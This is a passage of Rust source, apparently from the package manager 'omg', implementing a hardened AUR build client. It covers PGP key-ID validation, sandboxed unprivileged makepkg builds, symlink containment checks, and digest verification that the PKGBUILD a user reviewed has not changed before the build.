//! AUR (Arch User Repository) client with build support

use ahash::AHashSet;
use std::collections::{BTreeMap, BTreeSet, HashSet};
use std::fs::File;
use std::io::Read;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::{Arc, Mutex, OnceLock};
use std::time::Duration;

use alpm_types::Version;
use anyhow::{Context, Result};
use dialoguer::Confirm;
use futures::{FutureExt, StreamExt, future::BoxFuture};
use owo_colors::OwoColorize;
use serde::{Deserialize, de::DeserializeOwned};
use sha2::{Digest, Sha256};
use tokio::io::{AsyncRead, AsyncReadExt, AsyncWriteExt};
use tokio::process::Command;
use tracing::{instrument, warn};

use super::error::AurError;
#[cfg(test)]
use super::history::historical_version_not_found_message;
use super::history::srcinfo_version;
use super::parallel_build::BuildJob;
use super::utils::{
    build_user, create_dir_as_user, create_dir_as_user_sync, has_word_boundary_match, is_symlink,
    original_user, original_user_home, remove_dir_as_user, sudo_as_user_program,
    validate_build_dir,
};
use super::{approval, artifact_inspector};

use super::super::aur_deps::{check_dependencies_from_metadata, dependency_name};
use super::super::aur_index::AurIndex;
use super::super::aur_metadata::{AurJsonPackage, open_fresh_metadata_index};
use super::super::aur_sources::{
    download_sources, http_sources, prefetch_vcs_sources, vcs_sources,
};
#[cfg(feature = "pgp")]
use super::super::pkgbuild::PkgBuild;
use crate::config::{AurBuildMethod, AurSecurityProfile, Settings};
use crate::core::http::shared_client;
use crate::core::{Package, PackageSource, paths};
use crate::package_managers::arch_install::{
    InstallIntent, InstallItem, InstallRequest, InstallTarget, OfficialTarget,
};
use crate::package_managers::{get_potential_aur_packages, pacman_db};
use crate::runtimes::common::MAX_DECOMPRESSED_BYTES;

use crate::core::security::artifact::ArchiveSnapshot;
const AUR_RPC_URL: &str = "https://aur.archlinux.org/rpc";
// makepkg records BUILDDIR in .BUILDINFO; physical invocation storage stays private.
const SANDBOX_BUILD_ROOT: &str = "/omg-build";

fn sandbox_build_root(mount_destinations: &[&Path]) -> Result<PathBuf> {
    (0..=mount_destinations.len())
        .map(|index| {
            if index == 0 {
                PathBuf::from(SANDBOX_BUILD_ROOT)
            } else {
                PathBuf::from(format!("{SANDBOX_BUILD_ROOT}-{index}"))
            }
        })
        .find(|candidate| {
            mount_destinations.iter().all(|destination| {
                !destination.starts_with(candidate) && !candidate.starts_with(destination)
            })
        })
        .context("Sandbox build root overlaps an existing mount")
}

const AUR_GIT_URL: &str = "https://aur.archlinux.org";
const AUR_RPC_MAX_URI: usize = 4400;
const AUR_SEARCH_MAX_BYTES: usize = 100;

/// Process-wide lock around ALPM database mutations so parallel AUR builds never race.
/// ALPM serializes installs on `/var/lib/pacman/db.lck`, so concurrent installs — e.g. parallel AUR build
/// waves finishing together — either fail spuriously on the lock or race the
/// ALPM database. Builds stay parallel; installs are applied one at a time.
static INSTALL_LOCK: tokio::sync::Mutex<()> = tokio::sync::Mutex::const_new(());
static REVIEW_LOCK: tokio::sync::Mutex<()> = tokio::sync::Mutex::const_new(());
static PAIRED_BUILD_CACHE: OnceLock<Mutex<HashSet<String>>> = OnceLock::new();
const MAX_PKGBUILD_REVIEW_BYTES: usize = 1024 * 1024;
const SANDBOX_FAKEROOT_ENV: (&str, &str) = ("FAKEROOTDONTTRYCHOWN", "1");
const MAX_PKGINFO_BYTES: u64 = 128 * 1024;
const MAX_AUR_BUILD_LOG_BYTES: u64 = 64 * 1024 * 1024;
const MAX_AUR_BUILD_DURATION: Duration = Duration::from_hours(2);
/// Pre-computed length of the AUR RPC info base URL (47 bytes)
const AUR_RPC_INFO_BASE_LEN: usize = 47;

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// PGP Key ID Validation
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

/// Result of PGP key ID validation
#[cfg(any(feature = "pgp", test))]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PgpKeyIdStatus {
    /// Full 40-char fingerprint - most secure
    FullFingerprint,
    /// 16-char long key ID - acceptable
    LongKeyId,
    /// 8-char short key ID - INSECURE (vulnerable to collision attacks)
    ShortKeyId,
    /// Empty key ID
    Empty,
    /// Key ID too long (> 64 chars)
    TooLong,
    /// Contains non-hexadecimal characters
    InvalidChars,
    /// Non-standard length (not 8, 16, or 40 chars)
    NonStandardLength,
}

/// Validate a PGP key ID for security.
///
/// # Security
/// - **Short key IDs (8 chars)** are vulnerable to collision attacks where
///   an attacker generates a key with the same short ID as a trusted key.
/// - **Long key IDs (16 chars)** are acceptable but not ideal.
/// - **Full fingerprints (40 chars)** are strongly recommended.
///
/// # Returns
/// - `PgpKeyIdStatus` indicating the validation result:
///   - `"ABCDEF1234567890ABCDEF1234567890ABCDEF12"` → `FullFingerprint`
///   - `"ABCDEF1234567890"` → `LongKeyId`
///   - `"ABCDEF12"` or any 1-15 hex chars → `ShortKeyId` (rejected)
///   - `""` → `Empty`, `>64 chars` → `TooLong`, non-hex → `InvalidChars`,
///     other hex lengths → `NonStandardLength`
#[inline]
#[cfg(any(feature = "pgp", test))]
#[must_use]
pub fn validate_pgp_key_id(key_id: &str) -> PgpKeyIdStatus {
    if key_id.is_empty() {
        return PgpKeyIdStatus::Empty;
    }
    if key_id.len() > 64 {
        return PgpKeyIdStatus::TooLong;
    }
    if !key_id.chars().all(|c| c.is_ascii_hexdigit()) {
        return PgpKeyIdStatus::InvalidChars;
    }

    match key_id.len() {
        40 => PgpKeyIdStatus::FullFingerprint,
        16 => PgpKeyIdStatus::LongKeyId,
        8 => PgpKeyIdStatus::ShortKeyId,
        _ if key_id.len() < 16 => PgpKeyIdStatus::ShortKeyId,
        _ => PgpKeyIdStatus::NonStandardLength,
    }
}

#[cfg(any(feature = "pgp", test))]
fn require_fetchable_pgp_key_id(key_id: &str) -> Result<()> {
    match validate_pgp_key_id(key_id) {
        PgpKeyIdStatus::FullFingerprint | PgpKeyIdStatus::LongKeyId => Ok(()),
        PgpKeyIdStatus::NonStandardLength => {
            tracing::debug!(
                "PGP key ID '{key_id}' is {} chars (40-char fingerprint recommended)",
                key_id.len()
            );
            Ok(())
        }
        PgpKeyIdStatus::ShortKeyId => anyhow::bail!(
            "Rejecting short PGP key ID '{key_id}' (vulnerable to collision attacks). \
             Use full fingerprint (40 chars) or long key ID (16 chars)."
        ),
        PgpKeyIdStatus::Empty | PgpKeyIdStatus::TooLong => {
            anyhow::bail!("Invalid PGP key ID (bad length): {key_id}")
        }
        PgpKeyIdStatus::InvalidChars => {
            anyhow::bail!("Invalid PGP key ID (non-hex chars): {key_id}")
        }
    }
}

#[cfg(feature = "pgp")]
fn create_scoped_pgp_home(
    valid_keys: &[String],
    source_home: &Path,
    cache_dir: &Path,
) -> Result<tempfile::TempDir> {
    use crate::core::security::keyserver;

    std::fs::create_dir_all(cache_dir).with_context(|| {
        format!(
            "Failed to create AUR cache directory: {}",
            cache_dir.display()
        )
    })?;
    let build_keyring = tempfile::Builder::new()
        .prefix("aur-pgp-")
        .tempdir_in(cache_dir)
        .context("Failed to create package-scoped AUR PGP keyring")?;
    let gpg = crate::core::privilege::root_controlled_program_path("gpg")?;
    let exported = std::process::Command::new(&gpg)
        .arg("--no-options")
        .arg("--batch")
        .arg("--homedir")
        .arg(source_home)
        .arg("--export")
        .args(valid_keys)
        .output()
        .context("Failed to export AUR PGP keys")?;
    let export_stderr =
        crate::cli::style::sanitize_terminal_text(&String::from_utf8_lossy(&exported.stderr));
    anyhow::ensure!(
        exported.status.success() && !exported.stdout.is_empty(),
        "Failed to export AUR PGP keys: {}",
        export_stderr.trim()
    );
    let key_bundle = build_keyring.path().join("trusted-keys.pgp");
    std::fs::write(&key_bundle, &exported.stdout).context("Failed to stage AUR PGP keys")?;
    let imported = std::process::Command::new(&gpg)
        .arg("--no-options")
        .arg("--batch")
        .arg("--homedir")
        .arg(build_keyring.path())
        .arg("--import")
        .arg(&key_bundle)
        .output()
        .context("Failed to initialize package-scoped AUR PGP keyring")?;
    let import_stderr =
        crate::cli::style::sanitize_terminal_text(&String::from_utf8_lossy(&imported.stderr));
    anyhow::ensure!(
        imported.status.success(),
        "Failed to initialize package-scoped AUR PGP keyring: {}",
        import_stderr.trim()
    );
    for key_id in valid_keys {
        anyhow::ensure!(
            keyserver::is_key_in_gnupg(key_id, build_keyring.path())?,
            "Package-scoped AUR PGP keyring is missing {key_id}"
        );
    }
    Ok(build_keyring)
}

fn require_unprivileged_builder(package: &str, is_root: bool) -> Result<()> {
    if is_root {
        anyhow::bail!(
            "AUR packages must not be built as root.\n  \
             → Run omg as your regular user; it will request sudo only for dependency and package installation.\n  \
             → Retry without sudo: omg install {package}"
        );
    }
    Ok(())
}

/// AUR API client with build support
#[derive(Clone)]
pub struct AurClient {
    build_dir: PathBuf,
    settings: Settings,
    package_base_locks: Arc<dashmap::DashMap<String, Arc<tokio::sync::Mutex<()>>>>,
}

impl std::fmt::Debug for AurClient {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        // Deliberately excludes settings; they may carry user-specific paths.
        f.debug_struct("AurClient")
            .field("build_dir", &self.build_dir)
            // `settings` deliberately omitted: may carry user-specific paths.
            .finish_non_exhaustive()
    }
}

struct MakepkgEnv {
    // Own the private invocation tree until archives have been sealed.
    _invocation: tempfile::TempDir,
    makeflags: String,
    pkgdest: PathBuf,
    srcdest: PathBuf,
    builddir: PathBuf,
    compiler_cache_dirs: Vec<PathBuf>,
    extra_env: Vec<(String, String)>,
    pgp_home: Option<tempfile::TempDir>,
}

fn reproducible_source_epoch(source_digest: &str) -> Result<String> {
    let prefix = source_digest
        .get(..16)
        .context("Reviewed AUR source digest is truncated")?;
    let value = u64::from_str_radix(prefix, 16).context("Reviewed AUR source digest is invalid")?;
    // SOURCE_DATE_EPOCH is the reproducible-build ecosystem's standard input
    // for timestamps that would otherwise vary between builds. Deriving it
    // solely from the reviewed source preserves that invariant without trusting
    // repository-controlled Git metadata.
    // https://reproducible-builds.org/specs/source-date-epoch/
    // Arch makepkg unifies source/package mtimes and package metadata when this
    // variable is set: https://man.archlinux.org/man/makepkg.8#REPRODUCIBILITY
    Ok((946_684_800_u64 + value % 1_577_923_200).to_string())
}

fn set_reproducible_source_epoch(env: &mut MakepkgEnv, source: &ReviewedSource) -> Result<()> {
    env.extra_env.retain(|(key, _)| key != "SOURCE_DATE_EPOCH");
    env.extra_env.push((
        "SOURCE_DATE_EPOCH".to_owned(),
        reproducible_source_epoch(&source.digest)?,
    ));
    Ok(())
}

/// Change only the newly created invocation directory, using its open handle.
/// Children must be created after this succeeds when setup was elevated.
fn prepare_invocation_directory(
    path: &Path,
    owner: Option<(nix::unistd::Uid, nix::unistd::Gid)>,
) -> Result<()> {
    use std::os::unix::fs::{MetadataExt, OpenOptionsExt};
    let directory = std::fs::OpenOptions::new()
        .read(true)
        .custom_flags(nix::libc::O_DIRECTORY | nix::libc::O_NOFOLLOW | nix::libc::O_NONBLOCK)
        .open(path)?;
    let metadata = directory.metadata()?;
    anyhow::ensure!(
        metadata.is_dir()
            && metadata.uid() == nix::unistd::geteuid().as_raw()
            && metadata.mode() & 0o777 == 0o700,
        "AUR invocation must be a private directory owned by its creator"
    );
    if let Some((uid, gid)) = owner {
        nix::unistd::fchown(&directory, Some(uid), Some(gid))
            .context("Failed to assign the private AUR invocation to the build user")?;
        let metadata = directory.metadata()?;
        anyhow::ensure!(
            metadata.uid() == uid.as_raw()
                && metadata.gid() == gid.as_raw()
                && metadata.mode() & 0o777 == 0o700,
            "AUR invocation ownership or permissions did not match the build user"
        );
    }
    Ok(())
}

#[derive(Debug)]
pub(crate) struct AuthorizedBuild {
    // Keep cleanup excluded across the review-to-build handoff and dependency work.
    lifecycle_guard: File,
    package: String,
    requested_outputs: Vec<String>,
    reviewed_digest: ReviewedSource,
}

/// Sealed outputs admitted under the build's actual security profile.
#[derive(Debug)]
pub(crate) struct BuiltPackages {
    archives: Vec<ArchiveSnapshot>,
    profile: AurSecurityProfile,
    requested_outputs: BTreeSet<String>,
}

impl BuiltPackages {
    pub(crate) fn len(&self) -> usize {
        self.archives.len()
    }

    fn require_profile(&self, current: AurSecurityProfile) -> Result<()> {
        anyhow::ensure!(
            current != AurSecurityProfile::Hardened || self.profile == AurSecurityProfile::Hardened,
            "Packages built under the Standard AUR profile cannot be installed under the current Hardened profile; rebuild them under Hardened settings"
        );
        Ok(())
    }
}

/// The exact local source files approved before any build command runs.
#[derive(Debug)]
struct ReviewedSource {
    files: std::collections::BTreeMap<PathBuf, Vec<u8>>,
    digest: String,
    parsed_srcinfo: OnceLock<Arc<alpm_srcinfo::SourceInfoV1>>,
}

impl ReviewedSource {
    fn read_source_file(path: &Path) -> Result<Vec<u8>> {
        super::source_file::read_regular(path)
    }
    fn capture(directory: &Path) -> Result<Self> {
        fn visit(
            root: &Path,
            directory: &Path,
            files: &mut std::collections::BTreeMap<PathBuf, Vec<u8>>,
            budget: &mut usize,
            entries: &mut usize,
            depth: usize,
        ) -> Result<()> {
            anyhow::ensure!(depth <= 64, "AUR source nesting exceeds limit");
            for entry in std::fs::read_dir(directory)? {
                let entry = entry?;
                *entries += 1;
                anyhow::ensure!(*entries <= 10_000, "AUR source entry count exceeds limit");
                if entry.file_name() == ".git" {
                    continue;
                }
                let path = entry.path();
                let metadata = std::fs::symlink_metadata(&path)?;
                if metadata.file_type().is_symlink() {
                    let relative = path.strip_prefix(root)?.to_owned();
                    anyhow::ensure!(
                        relative.as_path() != Path::new("PKGBUILD")
                            && relative.as_path() != Path::new(".SRCINFO"),
                        "AUR {} must be a regular file, not a symlink",
                        review_path(&relative)
                    );
                    let target = std::fs::read_link(&path)?;
                    contained_aur_symlink_target(root, &path, &target)?;
                    let bytes = encode_symlink_manifest(&target);
                    *budget = budget
                        .checked_add(bytes.len())
                        .context("AUR source size overflow")?;
                    anyhow::ensure!(
                        *budget <= 64 * 1024 * 1024 && files.len() < 10_000,
                        "AUR source manifest exceeds file/count limits"
                    );
                    files.insert(relative, bytes);
                    continue;
                }
                if metadata.is_dir() {
                    visit(root, &path, files, budget, entries, depth + 1)?;
                } else {
                    anyhow::ensure!(
                        metadata.is_file()
                            && metadata.len() <= super::source_file::MAX_SOURCE_FILE_BYTES
                            && files.len() < 10_000,
                        "AUR source manifest exceeds file/count limits"
                    );
                    let bytes = ReviewedSource::read_source_file(&path)?;
                    *budget = budget
                        .checked_add(bytes.len())
                        .context("AUR source size overflow")?;
                    anyhow::ensure!(
                        *budget <= 64 * 1024 * 1024,
                        "AUR source manifest exceeds 64 MiB"
                    );
                    files.insert(path.strip_prefix(root)?.to_owned(), bytes);
                }
            }
            Ok(())
        }
        let mut files = std::collections::BTreeMap::new();
        visit(directory, directory, &mut files, &mut 0, &mut 0, 0)?;
        anyhow::ensure!(
            files.contains_key(Path::new("PKGBUILD")) && files.contains_key(Path::new(".SRCINFO")),
            "AUR review requires PKGBUILD and .SRCINFO"
        );
        let mut hash = Sha256::new();
        for (path, bytes) in &files {
            let path = path.to_str().context("AUR source path is not UTF-8")?;
            use std::os::unix::fs::PermissionsExt;
            hash.update(
                std::fs::symlink_metadata(directory.join(path))?
                    .permissions()
                    .mode()
                    .to_le_bytes(),
            );
            hash.update((path.len() as u64).to_le_bytes());
            hash.update(path.as_bytes());
            hash.update((bytes.len() as u64).to_le_bytes());
            hash.update(bytes);
        }
        Ok(Self {
            files,
            digest: hex::encode(hash.finalize()),
            parsed_srcinfo: OnceLock::new(),
        })
    }

    fn optional_srcinfo(&self) -> Result<Option<Arc<alpm_srcinfo::SourceInfoV1>>> {
        if let Some(parsed) = self.parsed_srcinfo.get() {
            return Ok(Some(Arc::clone(parsed)));
        }
        let Some(bytes) = self.files.get(Path::new(".SRCINFO")) else {
            return Ok(None);
        };
        let content = std::str::from_utf8(bytes).context("Failed to read .SRCINFO")?;
        let parsed = Arc::new(
            alpm_srcinfo::SourceInfoV1::from_string(content).context("Failed to parse .SRCINFO")?,
        );
        let _ = self.parsed_srcinfo.set(Arc::clone(&parsed));
        Ok(Some(Arc::clone(
            self.parsed_srcinfo.get().unwrap_or(&parsed),
        )))
    }

    fn required_srcinfo(&self, package: &str) -> Result<Arc<alpm_srcinfo::SourceInfoV1>> {
        self.optional_srcinfo()
            .with_context(|| format!("Failed to inspect dependencies for '{package}'"))?
            .with_context(|| format!(
            "AUR package '{package}' has no regular .SRCINFO; refusing to source its PKGBUILD to discover dependencies"
        ))
    }

    fn verify(&self, directory: &Path) -> Result<()> {
        let current = Self::capture(directory)?;
        anyhow::ensure!(
            current.digest == self.digest,
            "AUR source manifest changed after review"
        );
        Ok(())
    }
    fn text(&self, path: &Path) -> Result<&str> {
        let bytes = self
            .files
            .get(path)
            .with_context(|| format!("Unreviewed AUR input: {}", review_path(path)))?;
        Ok(std::str::from_utf8(bytes)?)
    }
}

fn encode_symlink_manifest(target: &Path) -> Vec<u8> {
    use std::os::unix::ffi::OsStrExt;
    let mut bytes = Vec::from(&b"symlink\0"[..]);
    bytes.extend_from_slice(target.as_os_str().as_bytes());
    bytes
}

/// Lexically resolve `target` from `link_path` and require the result stay
/// inside `root`. Absolute links and `..` escapes are attacks. Relative
/// links that stay in the checkout (license files, vendor aliases) are
/// hashed by target string, never followed.
fn contained_aur_symlink_target(root: &Path, link_path: &Path, target: &Path) -> Result<()> {
    let link_display = review_path(link_path);
    let target_display = review_path(target);
    anyhow::ensure!(
        target.is_relative(),
        "AUR source symlink must be relative: {link_display} -> {target_display}"
    );
    let mut resolved = link_path
        .parent()
        .map_or_else(|| root.to_path_buf(), Path::to_path_buf);
    for component in target.components() {
        match component {
            std::path::Component::Normal(part) => resolved.push(part),
            std::path::Component::CurDir => {}
            std::path::Component::ParentDir => {
                anyhow::ensure!(
                    resolved.starts_with(root) && resolved != root && resolved.pop(),
                    "AUR source symlink escapes the checkout: {link_display} -> {target_display}"
                );
            }
            std::path::Component::RootDir | std::path::Component::Prefix(_) => {
                anyhow::bail!(
                    "AUR source symlink must be relative: {link_display} -> {target_display}"
                );
            }
        }
    }
    anyhow::ensure!(
        resolved.starts_with(root) && resolved != root,
        "AUR source symlink escapes the checkout: {link_display} -> {target_display}"
    );
    Ok(())
}

#[derive(Debug)]
struct AurDependencyPlan {
    aur_dependencies: Vec<String>,
    official_dependencies: Vec<OfficialTarget>,
    package_outputs: Vec<String>,
}

fn resolve_official_dependency(
    alpm: &alpm::Alpm,
    relation: &str,
) -> Result<Option<OfficialTarget>> {
    for database in alpm.syncdbs() {
        if database.usage()?.contains(alpm::Usage::INSTALL) {
            crate::package_managers::alpm_ops::validate_sync_database(alpm, database)?;
        }
    }
    alpm.syncdbs()
        .find_satisfier(relation)
        .map(|package| {
            Ok(OfficialTarget {
                repository: package
                    .db()
                    .context("Official satisfier has no repository")?
                    .name()
                    .to_owned(),
                name: package.name().to_owned(),
                relations: vec![relation.to_owned()],
            })
        })
        .transpose()
}

fn reconcile_official_dependency(alpm: &alpm::Alpm, selected: &mut OfficialTarget) -> Result<()> {
    use crate::package_managers::types::{dependency_version_satisfies, provision_satisfies};

    for database in alpm.syncdbs() {
        if !database.usage()?.contains(alpm::Usage::INSTALL) {
            continue;
        }
        let candidate = match database.pkg(selected.name.as_str()) {
            Ok(candidate) => candidate,
            Err(alpm::Error::PkgNotFound) => continue,
            Err(error) => {
                return Err(error).with_context(|| {
                    format!("Failed to inspect '{}/{}'", database.name(), selected.name)
                });
            }
        };
        if selected.relations.iter().all(|relation| {
            let direct = candidate.name() == dependency_name(relation)
                && dependency_version_satisfies(relation, candidate.version().as_str());
            let provided = candidate
                .provides()
                .into_iter()
                .any(|provided| provision_satisfies(relation, &provided.to_string()));
            direct || provided
        }) {
            database.name().clone_into(&mut selected.repository);
            return Ok(());
        }
    }
    anyhow::bail!(
        "No install-eligible version of '{}' satisfies all required relations: {}",
        selected.name,
        selected.relations.join(", ")
    )
}

/// Identity and .INSTALL payload extracted from one package archive
/// (SEC-R2-01 cached-artifact provenance verification).
struct CachedArchiveIdentity {
    name: String,
    version: String,
    base: String,
    install_script: Option<String>,
    architecture: Option<String>,
}

#[derive(Clone, Copy)]
enum BuildOutputStream {
    Stdout,
    Stderr,
}

/// Drain one child stream completely so a quiet build can never block on a
/// full pipe. Log failures are remembered while draining continues; otherwise
/// a compiler could deadlock before omg has a chance to report the I/O error.
fn configure_auxiliary_output(command: &mut Command) {
    if crate::cli::modern_ui::output_mode() == crate::cli::modern_ui::OutputMode::Verbose {
        command.stdout(Stdio::inherit()).stderr(Stdio::inherit());
    } else {
        command.stdout(Stdio::null()).stderr(Stdio::null());
    }
}

/// Give PKGBUILD-driven processes a minimal deterministic environment.
/// Credentials, agent sockets, language injection paths, and caller-specific
/// tokens are absent because the command starts from `env_clear`.
fn configure_build_environment(command: &mut Command, home: &Path, user: &str) {
    command
        .env_clear()
        .env("PATH", "/usr/local/sbin:/usr/local/bin:/usr/bin")
        .env("HOME", home)
        .env("XDG_CACHE_HOME", home.join(".cache"))
        .env("USER", user)
        .env("LOGNAME", user)
        .env("LANG", "C.UTF-8")
        .env("LC_ALL", "C.UTF-8");
}

fn native_build_command() -> Result<Command> {
    let mut command = Command::new(crate::core::privilege::root_controlled_program_path(
        "setpriv",
    )?);
    command
        .args(["--no-new-privs", "--"])
        .arg(crate::core::privilege::root_controlled_program_path(
            "setsid",
        )?)
        .args(["-w", "makepkg"]);
    Ok(command)
}

fn sandbox_command(home: &Path, user: &str) -> Result<Command> {
    sandbox_command_with(
        home,
        user,
        crate::core::privilege::root_controlled_program_path,
    )
}

fn sandbox_command_with(
    home: &Path,
    user: &str,
    resolve: impl FnOnce(&str) -> Result<PathBuf>,
) -> Result<Command> {
    let mut command = Command::new(resolve("bwrap")?);
    configure_build_environment(&mut command, home, user);
    command.args([
        "--clearenv",
        "--share-net",
        "--unshare-pid",
        "--new-session",
        "--die-with-parent",
    ]);
    Ok(command)
}

/// Make `/etc/resolv.conf` usable when it points outside the read-only `/etc`
/// mount, as systemd-resolved and NetworkManager commonly do under `/run`.
fn configure_sandbox_resolver(command: &mut Command) -> Result<()> {
    configure_sandbox_resolver_at(command, "/etc/resolv.conf".as_ref())
}

fn configure_sandbox_resolver_at(command: &mut Command, resolver_config: &Path) -> Result<()> {
    let resolver = match resolver_config.canonicalize() {
        Ok(resolved) => resolved,
        // A host without a resolver (container, offline chroot, dangling
        // symlink to an unmounted /run) has nothing to bind; skipping keeps
        // the sandbox identical to the host instead of failing every build.
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(()),
        Err(error) => {
            return Err(error).with_context(|| {
                format!(
                    "Failed to resolve {} for the AUR sandbox",
                    resolver_config.display()
                )
            });
        }
    };
    if resolver.starts_with("/etc") {
        return Ok(());
    }
    anyhow::ensure!(
        resolver.is_file(),
        "AUR sandbox resolver target is not a file: {}",
        resolver.display()
    );

    let mut parents: Vec<_> = resolver
        .parent()
        .into_iter()
        .flat_map(Path::ancestors)
        .filter(|path| *path != Path::new("/"))
        .collect();
    parents.reverse();
    for parent in parents {
        command.arg("--dir").arg(parent);
    }
    command.arg("--ro-bind").arg(&resolver).arg(&resolver);
    Ok(())
}

fn build_identity() -> (String, PathBuf) {
    let user =
        build_user().unwrap_or_else(|| whoami::username().unwrap_or_else(|_| "nobody".into()));
    let home = std::env::var_os("SUDO_HOME")
        .map(PathBuf::from)
        .or_else(home::home_dir)
        .unwrap_or_else(|| PathBuf::from(format!("/home/{user}")));
    (user, home)
}

fn pkgbuild_review_text(bytes: &[u8]) -> Result<String> {
    anyhow::ensure!(
        bytes.len() <= MAX_PKGBUILD_REVIEW_BYTES,
        "PKGBUILD exceeds the {MAX_PKGBUILD_REVIEW_BYTES} byte review limit"
    );
    let text = String::from_utf8_lossy(bytes);
    Ok(text
        .chars()
        .filter(|character| {
            matches!(character, '\n' | '\t')
                || (!character.is_control()
                    && !matches!(
                        character,
                        '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}'
                    ))
        })
        .collect())
}

/// SHA-256 hex digest of raw PKGBUILD bytes.
fn pkgbuild_digest(bytes: &[u8]) -> String {
    hex::encode(Sha256::digest(bytes))
}

/// Re-read `pkgbuild_path` and confirm its bytes still hash to the digest the
/// user reviewed. A mismatch means the PKGBUILD changed between review and
/// build and the reviewed script is not the one about to run.
#[cfg(test)]
fn verify_reviewed_pkgbuild(pkgbuild_path: &Path, reviewed_digest: &str) -> Result<()> {
    let bytes = std::fs::read(pkgbuild_path)
        .with_context(|| format!("Failed to re-read PKGBUILD: {}", pkgbuild_path.display()))?;
    anyhow::ensure!(
        pkgbuild_digest(&bytes) == reviewed_digest,
        "PKGBUILD changed after review: {} (refusing to build a script the user did not review)",
        pkgbuild_path.display()
    );
    Ok(())
}

/// Diagnostic preview: threat-relevant assignments first, then fill. The
/// SHA-256 still covers every byte of every reviewed file.
const MAX_PKGBUILD_PREVIEW_LINES: usize = 8;
const PREVIEW_LINE_CHARS: usize = 96;
const PREVIEW_ASSIGNMENTS: &[&str] = &[
    "source",
    "sha256sums",
    "sha512sums",
    "b2sums",
    "install",
    "url",
    "depends",
    "pkgver",
];

fn assignment_name(line: &str) -> Option<&str> {
    let trimmed = line.trim_start();
    let name = trimmed.split(['=', '(']).next()?.trim();
    if name.is_empty() {
        return None;
    }
    name.chars()
        .all(|character| character == '_' || character.is_ascii_alphanumeric())
        .then_some(name)
}

fn pkgbuild_maintainer(text: &str) -> Option<String> {
    for line in text.lines().take(30) {
        let trimmed = line.trim();
        let rest = trimmed
            .strip_prefix("# Maintainer:")
            .or_else(|| trimmed.strip_prefix("# Contributor:"))?;
        let cleaned = crate::cli::style::sanitize_terminal_text(rest.trim());
        if !cleaned.is_empty() {
            return Some(cleaned);
        }
    }
    None
}

fn preview_pkgbuild_lines(text: &str, limit: usize) -> Vec<(usize, String)> {
    let numbered: Vec<(usize, &str)> = text
        .lines()
        .enumerate()
        .map(|(index, line)| (index + 1, line))
        .collect();
    let mut picked = Vec::new();
    let mut used = std::collections::HashSet::new();
    for (number, line) in &numbered {
        let Some(name) = assignment_name(line) else {
            continue;
        };
        if !PREVIEW_ASSIGNMENTS.contains(&name) {
            continue;
        }
        if used.insert(*number) {
            picked.push((*number, (*line).to_string()));
        }
        if picked.len() >= limit {
            return picked;
        }
    }
    for (number, line) in numbered {
        if used.contains(&number) {
            continue;
        }
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        picked.push((number, line.to_string()));
        if picked.len() >= limit {
            break;
        }
    }
    picked
}

fn join_limited(values: &[String], cap: usize) -> String {
    if values.len() <= cap {
        values
            .iter()
            .map(|value| crate::cli::style::sanitize_terminal_text(value))
            .collect::<Vec<_>>()
            .join(", ")
    } else {
        let shown = values[..cap]
            .iter()
            .map(|value| crate::cli::style::sanitize_terminal_text(value))
            .collect::<Vec<_>>()
            .join(", ");
        format!("{shown}, +{} more", values.len() - cap)
    }
}

struct AurReviewFiles<'a> {
    relative: &'a Path,
    bytes: usize,
    digest: String,
}

/// Keep untrusted source names visible as single-line data, including literal
/// backslashes, controls and invisible Unicode. Filesystem and hash inputs
/// retain their original bytes.
fn review_path(path: &Path) -> String {
    path.to_string_lossy().escape_debug().to_string()
}

fn pkgbuild_review_panel(
    package: &str,
    digest: &str,
    review: &str,
    pkgbuild_path: &Path,
    extra_files: &[AurReviewFiles<'_>],
    install_hooks: &[(String, String)],
    verbose: bool,
) -> String {
    use crate::cli::chrome;

    let package = crate::cli::style::sanitize_terminal_text(package);
    let trimmed = review.trim_end();
    let total_lines = trimmed.lines().count();
    let meta = crate::package_managers::pkgbuild::PkgBuild::parse_content(trimmed).ok();
    let version = meta.as_ref().map(|pkg| {
        format!(
            "{}-{}",
            crate::cli::style::sanitize_terminal_text(&pkg.version.to_string()),
            crate::cli::style::sanitize_terminal_text(&pkg.release)
        )
    });
    let url = meta.as_ref().and_then(|pkg| {
        let url = crate::cli::style::sanitize_terminal_text(&pkg.url);
        (!url.is_empty()).then_some(url)
    });
    let depends = meta
        .as_ref()
        .filter(|pkg| !pkg.depends.is_empty())
        .map(|pkg| join_limited(&pkg.depends, 5));
    let maintainer = pkgbuild_maintainer(trimmed);

    let mut lines = Vec::new();
    lines.push(String::new());
    if crate::cli::style::colors_enabled() {
        lines.push(format!(
            "  {}  {}  {}",
            chrome::accent_rail(),
            "AUR".bold(),
            package.bold()
        ));
    } else {
        lines.push(format!("  {}  AUR  {package}", chrome::accent_rail()));
    }
    lines.push(chrome::rail_line(""));
    lines.push(chrome::rail_line(&chrome::digest_stripe(digest)));
    lines.push(chrome::rail_line(""));

    let package_value = match version {
        Some(version) => format!("{package}  {version}"),
        None => package,
    };
    lines.push(chrome::kv("package", &package_value));
    if let Some(url) = url {
        lines.push(chrome::kv("url", &chrome::osc8_http(&url, &url)));
    }
    if let Some(depends) = depends {
        lines.push(chrome::kv("depends", &depends));
    }
    if let Some(maintainer) = maintainer {
        lines.push(chrome::kv("maint", &maintainer));
    }

    let mut file_names = vec!["PKGBUILD".to_string()];
    file_names.extend(extra_files.iter().map(|file| review_path(file.relative)));
    lines.push(chrome::kv("files", &file_names.join("  ")));
    lines.push(chrome::kv("sha-256", digest));
    lines.push(chrome::kv(
        "open",
        &chrome::osc8_file(pkgbuild_path, &review_path(pkgbuild_path)),
    ));
    lines.push(chrome::rail_line(""));

    if verbose {
        for (number, line) in trimmed.lines().enumerate() {
            lines.push(chrome::snippet_line(number + 1, line));
        }
        for file in extra_files {
            lines.push(chrome::rail_line(""));
            lines.push(chrome::kv(
                "file",
                &format!(
                    "{}  {} B  {}",
                    review_path(file.relative),
